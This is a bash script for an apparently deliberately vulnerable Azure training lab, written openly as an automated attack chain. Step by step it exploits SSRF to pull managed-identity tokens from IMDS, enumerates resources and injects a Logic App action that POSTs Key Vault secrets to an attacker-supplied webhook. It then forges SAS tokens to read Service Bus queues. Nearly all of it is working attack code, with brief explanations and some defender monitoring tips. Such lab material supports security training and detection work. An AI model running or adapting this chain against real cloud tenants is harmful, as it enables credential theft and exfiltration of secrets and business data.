#!/usr/bin/env bash
set -euo pipefail

#############################################
# Pretty TUI: colors, banner, spinner, utils
#############################################

if [ -t 1 ] && [ -z "${NO_COLOR:-}" ]; then
  if command -v tput >/dev/null 2>&1 && [ "$(tput colors 2>/dev/null || echo 0)" -ge 8 ]; then
    RED="$(tput setaf 1)"; GREEN="$(tput setaf 2)"; YELLOW="$(tput setaf 3)"; BLUE="$(tput setaf 4)"
    MAGENTA="$(tput setaf 5)"; CYAN="$(tput setaf 6)"; BOLD="$(tput bold)"; RESET="$(tput sgr0)"
  else
    RED=$'\033[31m'; GREEN=$'\033[32m'; YELLOW=$'\033[33m'; BLUE=$'\033[34m'
    MAGENTA=$'\033[35m'; CYAN=$'\033[36m'; BOLD=$'\033[1m'; RESET=$'\033[0m'
  fi
else
  RED=""; GREEN=""; YELLOW=""; BLUE=""; MAGENTA=""; CYAN=""; BOLD=""; RESET=""
fi

step() { printf "\n[%s] %s[*]%s %s\n" "$(date +%H:%M:%S)" "${YELLOW}" "${RESET}" "$*"; }
ok()   { printf "[%s] %s[OK]%s  %s\n" "$(date +%H:%M:%S)" "${GREEN}" "${RESET}" "$*"; }
err()  { printf "[%s] %s[ERR]%s %s\n" "$(date +%H:%M:%S)" "${RED}" "${RESET}" "$*"; }
info() { printf "%s[i]%s   %s\n"  "${BLUE}"   "${RESET}" "$*"; }

printf "%s%s%s\n" "${BOLD}${GREEN}" "  ________  ___  _____          __     " "${RESET}"
printf "%s%s%s\n" "${BOLD}${GREEN}" " / ___/ _ \\/ _ \\/ ___/__  ___ _/ /_    " "${RESET}"
printf "%s%s%s\n" "${BOLD}${GREEN}" "/ /__/ // / , _/ (_ / _ \\/ _ \`/ __/   " "${RESET}"
printf "%s%s%s\n" "${BOLD}${GREEN}" "\\___/____/_/|_|\\___/\\___/\\_,_/\\__/" "${RESET}"
printf "\n"

SPIN_PID=""
spin_start() {
  local msg="$*"
  printf "%s[>] %s%s " "${MAGENTA}" "${msg}" "${RESET}"
  ( while :; do
      for c in '⠋' '⠙' '⠹' '⠸' '⠼' '⠴' '⠦' '⠧' '⠇' '⠏'; do
        printf "\r%s[>] %s%s %s" "${MAGENTA}" "${msg}" "${RESET}" "$c"
        sleep 0.08
      done
    done ) & SPIN_PID=$!
  disown || true
}
spin_stop() { [ -n "${SPIN_PID}" ] && kill "${SPIN_PID}" >/dev/null 2>&1 || true; SPIN_PID=""; printf "\r%*s\r" 120 ""; }

banner() {
  printf "%s%s%s\n" "${BOLD}${CYAN}" "===       CDRGoat Azure - Scenario 12                ===" "${RESET}"
  printf "%sSSRF → Logic App Injection → Key Vault → Service Bus%s\n\n" "${GREEN}" "${RESET}"
  printf "This automated attack script will:\n"
  printf "  • Step 1. Exploit SSRF to steal MI tokens\n"
  printf "  • Step 2. Enumerate resources and discover Logic App\n"
  printf "  • Step 3. Read Logic App workflow definition\n"
  printf "  • Step 4. Inject exfiltration action into workflow\n"
  printf "  • Step 5. Trigger Logic App to exfiltrate Key Vault secrets\n"
  printf "  • Step 6. Use stolen Service Bus connection to read messages\n"
}
banner

#############################################
# Preflight checks
#############################################
step "Preflight checks"
missing=0
for c in curl jq; do
  if ! command -v "$c" >/dev/null 2>&1; then err "Missing dependency: $c"; missing=1; fi
done
[ "$missing" -eq 0 ] && ok "All required tools present" || { err "Install missing tools and re-run"; exit 2; }

#############################################
# Step 1. Exploit SSRF to steal MI tokens
#############################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 1. Exploit SSRF to steal Managed Identity tokens  ===" "${RESET}"

step "Function App URL input"
read -r -p "  Function App URL (e.g., https://streamgoat-12-func-xxxxx.azurewebsites.net): " FUNC_URL
FUNC_URL="${FUNC_URL%/}"

if [ -z "$FUNC_URL" ]; then
  err "Function App URL is required"
  exit 1
fi

step "Verifying SSRF vulnerability"
spin_start "Testing /api/fetch endpoint"

set +e
SSRF_TEST="$(curl -sS "${FUNC_URL}/api/fetch?url=https://ifconfig.me" 2>&1)"
CURL_RC=$?
set -e
spin_stop

if [ $CURL_RC -ne 0 ] || [ -z "$SSRF_TEST" ]; then
  err "SSRF test failed"
  exit 1
fi

ok "SSRF confirmed"

step "Stealing ARM token via IMDS"
spin_start "Requesting management token"

IMDS_URL="http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com"
ENCODED_URL="$(python3 -c "import urllib.parse; print(urllib.parse.quote('${IMDS_URL}', safe=''))")"

set +e
ARM_TOKEN_JSON="$(curl -sS "${FUNC_URL}/api/fetch?url=${ENCODED_URL}")"
set -e
spin_stop

ARM_TOKEN="$(echo "$ARM_TOKEN_JSON" | jq -r '.access_token // empty')"

if [ -z "$ARM_TOKEN" ]; then
  err "Failed to steal ARM token"
  exit 1
fi

ok "ARM token stolen via SSRF → IMDS"

# Parse JWT
TOKEN_PAYLOAD="$(echo "$ARM_TOKEN" | awk -F. '{print $2}' | tr '_-' '/+' | base64 -d 2>/dev/null | jq .)"
TENANT_ID="$(echo "$TOKEN_PAYLOAD" | jq -r '.tid')"

SUBS_JSON="$(curl -sS -H "Authorization: Bearer $ARM_TOKEN" \
  "https://management.azure.com/subscriptions?api-version=2022-12-01")"
SUB_ID="$(echo "$SUBS_JSON" | jq -r '.value[0].subscriptionId')"

info "Tenant: ${YELLOW}${TENANT_ID}${RESET}"
info "Subscription: ${YELLOW}${SUB_ID}${RESET}"

read -r -p "Step 1 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

#############################################
# Step 2. Enumerate resources
#############################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 2. Enumerate resources and discover Logic App  ===" "${RESET}"

step "Listing resources"
spin_start "Calling ARM resources API"

RESOURCES_JSON="$(curl -sS -H "Authorization: Bearer $ARM_TOKEN" \
  "https://management.azure.com/subscriptions/${SUB_ID}/resources?api-version=2022-12-01")"

spin_stop

RESOURCE_GROUP="$(echo "$RESOURCES_JSON" | jq -r '.value[0].id | split("/")[4]')"

echo "$RESOURCES_JSON" | jq -r --arg Y "$YELLOW" --arg R "$RESET" \
  '.value[] | "  • [\(.type)] \($Y)\(.name)\($R)"'

LOGIC_APP_NAME="$(echo "$RESOURCES_JSON" | jq -r '.value[] | select(.type == "Microsoft.Logic/workflows") | .name')"
KV_NAME="$(echo "$RESOURCES_JSON" | jq -r '.value[] | select(.type == "Microsoft.KeyVault/vaults") | .name')"
SB_NAME="$(echo "$RESOURCES_JSON" | jq -r '.value[] | select(.type == "Microsoft.ServiceBus/namespaces") | .name')"

ok "Found key resources:"
info "Logic App:   ${YELLOW}${LOGIC_APP_NAME}${RESET}"
info "Key Vault:   ${YELLOW}${KV_NAME}${RESET}"
info "Service Bus: ${YELLOW}${SB_NAME}${RESET}"

#############################################
# Operator explanation
#############################################
printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "The MI has ${MAGENTA}Logic App Contributor${RESET} on the Resource Group.\n"
printf "This allows full management of Logic App workflows.\n\n"
printf "The Logic App has its own MI with:\n"
printf "  • ${YELLOW}Key Vault Secrets User${RESET} (can read secrets)\n"
printf "  • ${YELLOW}Service Bus Data Sender${RESET} (can send messages)\n\n"

read -r -p "Step 2 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

#############################################
# Step 3. Read Logic App workflow
#############################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 3. Read Logic App workflow definition  ===" "${RESET}"

step "Fetching Logic App workflow definition"
spin_start "GET workflow via ARM API"

LOGIC_APP_JSON="$(curl -sS -H "Authorization: Bearer $ARM_TOKEN" \
  "https://management.azure.com/subscriptions/${SUB_ID}/resourceGroups/${RESOURCE_GROUP}/providers/Microsoft.Logic/workflows/${LOGIC_APP_NAME}?api-version=2019-05-01")"

spin_stop

# Save original definition for later restoration
ORIGINAL_DEFINITION="$(echo "$LOGIC_APP_JSON" | jq '.properties.definition')"
LOGIC_APP_LOCATION="$(echo "$LOGIC_APP_JSON" | jq -r '.location')"

ok "Workflow definition retrieved"

step "Analyzing workflow actions"
echo "$LOGIC_APP_JSON" | jq '.properties.definition.actions | keys[]' 2>/dev/null | while read -r action; do
  printf "  • Action: %s%s%s\n" "$YELLOW" "$action" "$RESET"
done

# Get the trigger URL
step "Retrieving Logic App trigger callback URL"
spin_start "Listing trigger callback URLs"

CALLBACK_JSON="$(curl -sS -X POST -H "Authorization: Bearer $ARM_TOKEN" \
  "https://management.azure.com/subscriptions/${SUB_ID}/resourceGroups/${RESOURCE_GROUP}/providers/Microsoft.Logic/workflows/${LOGIC_APP_NAME}/triggers/order-webhook/listCallbackUrl?api-version=2019-05-01")"

spin_stop

TRIGGER_URL="$(echo "$CALLBACK_JSON" | jq -r '.value // empty')"

if [ -z "$TRIGGER_URL" ]; then
  err "Could not retrieve trigger URL"
  exit 1
fi

ok "Trigger URL obtained"
info "URL: ${TRIGGER_URL:0:80}..."

#############################################
# Operator explanation
#############################################
printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "We read the Logic App's workflow definition and found:\n"
printf "  • HTTP trigger that accepts order payloads\n"
printf "  • Action that reads a ${YELLOW}Key Vault secret${RESET}\n\n"
printf "Next: Inject an HTTP action that exfiltrates the Key Vault secret\n"
printf "to an attacker-controlled endpoint before the normal flow continues.\n\n"

read -r -p "Step 3 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

#############################################
# Step 4. Inject exfiltration action
#############################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 4. Inject exfiltration action into Logic App workflow  ===" "${RESET}"

step "Webhook endpoint for exfiltration"
printf "Enter a webhook URL to receive exfiltrated secrets.\n"
printf "(Use https://webhook.site to get a free endpoint)\n\n"
read -r -p "  Webhook URL: " EXFIL_WEBHOOK

if [ -z "$EXFIL_WEBHOOK" ]; then
  EXFIL_WEBHOOK="https://webhook.site/placeholder"
  info "Using placeholder webhook — in a real attack this would be attacker-controlled"
fi

KV_URI="https://${KV_NAME}.vault.azure.net"

step "Modifying Logic App workflow"
spin_start "Injecting exfiltration action via ARM PUT"

# Build the modified workflow definition with an exfil action
MODIFIED_DEFINITION="$(cat <<DEFEOF
{
  "\$schema": "https://schema.management.azure.com/providers/Microsoft.Logic/schemas/2016-06-01/workflowdefinition.json#",
  "contentVersion": "1.0.0.0",
  "triggers": {
    "order-webhook": {
      "type": "Request",
      "kind": "Http",
      "inputs": {
        "schema": {
          "type": "object",
          "properties": {
            "orderId": {"type": "string"},
            "customer": {"type": "string"},
            "amount": {"type": "number"}
          }
        }
      }
    }
  },
  "actions": {
    "Get-ServiceBus-Secret": {
      "type": "Http",
      "inputs": {
        "method": "GET",
        "uri": "${KV_URI}/secrets/servicebus-listen-connection?api-version=7.4",
        "authentication": {
          "type": "ManagedServiceIdentity"
        }
      },
      "runAfter": {}
    },
    "Get-Send-Secret": {
      "type": "Http",
      "inputs": {
        "method": "GET",
        "uri": "${KV_URI}/secrets/servicebus-send-connection?api-version=7.4",
        "authentication": {
          "type": "ManagedServiceIdentity"
        }
      },
      "runAfter": {}
    },
    "Exfiltrate-Secrets": {
      "type": "Http",
      "inputs": {
        "method": "POST",
        "uri": "${EXFIL_WEBHOOK}",
        "headers": {
          "Content-Type": "application/json"
        },
        "body": {
          "listen_secret": "@body('Get-ServiceBus-Secret')",
          "send_secret": "@body('Get-Send-Secret')",
          "trigger_body": "@triggerBody()"
        }
      },
      "runAfter": {
        "Get-ServiceBus-Secret": ["Succeeded"],
        "Get-Send-Secret": ["Succeeded"]
      }
    },
    "Response": {
      "type": "Response",
      "inputs": {
        "statusCode": 200,
        "body": {"status": "order received"}
      },
      "runAfter": {
        "Exfiltrate-Secrets": ["Succeeded"]
      }
    }
  }
}
DEFEOF
)"

set +e
UPDATE_RESP="$(curl -sS -X PUT \
  -H "Authorization: Bearer $ARM_TOKEN" \
  -H "Content-Type: application/json" \
  "https://management.azure.com/subscriptions/${SUB_ID}/resourceGroups/${RESOURCE_GROUP}/providers/Microsoft.Logic/workflows/${LOGIC_APP_NAME}?api-version=2019-05-01" \
  -d "{
    \"location\": \"${LOGIC_APP_LOCATION}\",
    \"identity\": {\"type\": \"SystemAssigned\"},
    \"properties\": {
      \"definition\": ${MODIFIED_DEFINITION}
    }
  }")"
set -e
spin_stop

if echo "$UPDATE_RESP" | jq -e '.error' >/dev/null 2>&1; then
  err "Failed to update Logic App"
  echo "$UPDATE_RESP" | jq '.error'
  exit 1
fi

ok "Logic App workflow modified with exfiltration action!"

# Re-fetch trigger URL (may change after update)
sleep 5
CALLBACK_JSON="$(curl -sS -X POST -H "Authorization: Bearer $ARM_TOKEN" \
  "https://management.azure.com/subscriptions/${SUB_ID}/resourceGroups/${RESOURCE_GROUP}/providers/Microsoft.Logic/workflows/${LOGIC_APP_NAME}/triggers/order-webhook/listCallbackUrl?api-version=2019-05-01")"
TRIGGER_URL="$(echo "$CALLBACK_JSON" | jq -r '.value // empty')"

#############################################
# Operator explanation
#############################################
printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "We injected an ${RED}Exfiltrate-Secrets${RESET} action into the workflow:\n\n"
printf "  1. Original: HTTP trigger → Get Key Vault secret → Send to Service Bus\n"
printf "  2. Modified: HTTP trigger → Get secrets → ${RED}POST secrets to webhook${RESET} → Response\n\n"
printf "The normal flow appears to continue, but secrets are siphoned to the attacker.\n"
printf "This is a supply-chain-style attack on integration workflows.\n\n"

read -r -p "Step 4 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

#############################################
# Step 5. Trigger the Logic App
#############################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 5. Trigger Logic App to exfiltrate Key Vault secrets  ===" "${RESET}"

step "Triggering Logic App with sample order"
spin_start "POST to Logic App HTTP trigger"

set +e
TRIGGER_RESP="$(curl -sS -X POST \
  -H "Content-Type: application/json" \
  -d '{"orderId":"ORD-ATTACK-001","customer":"attacker@evil.com","amount":99999}' \
  "$TRIGGER_URL")"
TRIGGER_RC=$?
set -e
spin_stop

if [ $TRIGGER_RC -eq 0 ]; then
  ok "Logic App triggered successfully"
  info "Response: ${TRIGGER_RESP}"
else
  err "Trigger failed (rc=${TRIGGER_RC})"
fi

step "Checking exfiltration webhook"
info "If using webhook.site, check: ${YELLOW}${EXFIL_WEBHOOK}${RESET}"
info "The webhook should have received the Key Vault secrets."
printf "\n"

printf "The exfiltrated payload contains:\n"
printf "  • ${RED}servicebus-listen-connection${RESET}: Full SAS connection string\n"
printf "  • ${RED}servicebus-send-connection${RESET}: Full SAS connection string\n"
printf "  • The original trigger body (order data)\n\n"

# Ask user to paste the connection string
printf "If you have the listen connection string from the webhook, paste it now\n"
printf "(or press Enter to skip Service Bus message reading):\n\n"
read -r -p "  Service Bus Listen Connection String: " SB_CONN_STRING

read -r -p "Step 5 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

#############################################
# Step 6. Read Service Bus messages
#############################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 6. Use stolen Service Bus connection to read messages  ===" "${RESET}"

if [ -n "$SB_CONN_STRING" ]; then
  step "Parsing Service Bus connection string"

  SB_ENDPOINT="$(echo "$SB_CONN_STRING" | sed -n 's/.*Endpoint=sb:\/\/\([^;]*\);.*/\1/p')"
  SB_KEY_NAME="$(echo "$SB_CONN_STRING" | sed -n 's/.*SharedAccessKeyName=\([^;]*\).*/\1/p')"
  SB_KEY="$(echo "$SB_CONN_STRING" | sed -n 's/.*SharedAccessKey=\(.*\)/\1/p')"

  info "Endpoint: ${YELLOW}${SB_ENDPOINT}${RESET}"
  info "Key Name: ${YELLOW}${SB_KEY_NAME}${RESET}"

  step "Attempting to read messages from queue"
  spin_start "Peeking messages from incoming-orders queue"

  # Generate SAS token
  SB_URI="https://${SB_ENDPOINT}incoming-orders"
  EXPIRY=$(($(date +%s) + 3600))
  SIG_STRING="${SB_URI}
${EXPIRY}"
  SIG="$(printf '%s' "$SIG_STRING" | openssl dgst -sha256 -hmac "$SB_KEY" -binary | base64)"
  ENCODED_SIG="$(python3 -c "import urllib.parse; print(urllib.parse.quote('${SIG}', safe=''))")"
  SAS_TOKEN="SharedAccessSignature sr=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${SB_URI}', safe=''))")&sig=${ENCODED_SIG}&se=${EXPIRY}&skn=${SB_KEY_NAME}"

  set +e
  PEEK_RESP="$(curl -sS \
    -H "Authorization: ${SAS_TOKEN}" \
    "${SB_URI}/messages/head?timeout=5&api-version=2017-04" 2>&1)"
  PEEK_RC=$?
  set -e
  spin_stop

  if [ $PEEK_RC -eq 0 ] && [ -n "$PEEK_RESP" ]; then
    printf "\n%s%s%s\n" "${BOLD}${RED}" "=== SERVICE BUS MESSAGES ===" "${RESET}"
    echo "$PEEK_RESP" | jq . 2>/dev/null || echo "$PEEK_RESP"
  else
    info "No messages in queue (or connection issue)"
    info "In production, queued messages containing sensitive business data would be readable"
  fi
else
  info "Skipping Service Bus message reading (no connection string provided)"
  info "In a real attack, the webhook would capture the connection string"
fi

################################################################################
# Cleanup: Restore original workflow
################################################################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Cleanup  ===" "${RESET}"

read -r -p "Restore original Logic App workflow? [y/N]: " RESTORE_CONFIRM

if [[ "$RESTORE_CONFIRM" =~ ^[Yy]$ ]]; then
  step "Restoring original workflow definition"
  spin_start "PUT original definition"

  curl -sS -X PUT \
    -H "Authorization: Bearer $ARM_TOKEN" \
    -H "Content-Type: application/json" \
    "https://management.azure.com/subscriptions/${SUB_ID}/resourceGroups/${RESOURCE_GROUP}/providers/Microsoft.Logic/workflows/${LOGIC_APP_NAME}?api-version=2019-05-01" \
    -d "{
      \"location\": \"${LOGIC_APP_LOCATION}\",
      \"identity\": {\"type\": \"SystemAssigned\"},
      \"properties\": {
        \"definition\": ${ORIGINAL_DEFINITION}
      }
    }" >/dev/null

  spin_stop
  ok "Original workflow restored"
fi

################################################################################
# Final Summary
################################################################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Attack Simulation Complete  ===" "${RESET}"

printf "\n%s%s%s\n" "${BOLD}${GREEN}" "Attack chain executed:" "${RESET}"
printf "  1. Exploited SSRF on Function App to steal MI tokens\n"
printf "  2. Enumerated resources — found Logic App, Key Vault, Service Bus\n"
printf "  3. Read Logic App workflow definition (HTTP trigger + KV action)\n"
printf "  4. Injected exfiltration action (POST secrets to attacker webhook)\n"
printf "  5. Triggered Logic App — Key Vault secrets sent to webhook\n"
printf "  6. Used stolen Service Bus connection string to read queue messages\n\n"

printf "%s%s%s\n" "${BOLD}${RED}" "Impact:" "${RESET}"
printf "  • Key Vault secrets exfiltrated via Logic App workflow injection\n"
printf "  • Service Bus connection strings stolen\n"
printf "  • Attacker can read all queued messages (business data)\n"
printf "  • Normal Logic App flow maintained (stealthy)\n\n"

printf "%s\n" "Defenders should monitor for:"
printf "  • Logic App workflow definition changes\n"
printf "  • Outbound HTTP calls from Logic Apps to unknown endpoints\n"
printf "  • Logic App execution with modified action sets\n"
printf "  • Key Vault access from Logic App MI at unusual times\n"
printf "  • Service Bus reads from unexpected clients\n"
